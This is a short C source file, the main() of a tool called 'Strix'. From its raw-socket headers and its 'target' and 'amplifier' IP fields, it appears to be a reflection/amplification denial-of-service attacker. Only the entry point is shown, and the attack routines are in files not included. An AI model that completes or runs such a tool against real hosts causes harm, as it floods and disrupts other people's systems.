
#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <sys/socket.h>
#include <sys/types.h>

#include "strix.h"
#include "manager.h"
#include "planner.h"
#include "cli.h"

int main(int argc, char **argv)
{

    
  AttackDraft * draft = createAttackDraft(argc, argv);
  fprintf(stdout, "Strix\n");
  
  fprintf(stdout, "target:%s\n", draft->target_ip);
  fprintf(stdout, "amplifier:%s\n", draft->amp_ip);
  StrixManager( draft, 1 );
  fprintf(stdout, "Good Bye\n");
  free(draft);
  return 0;

}
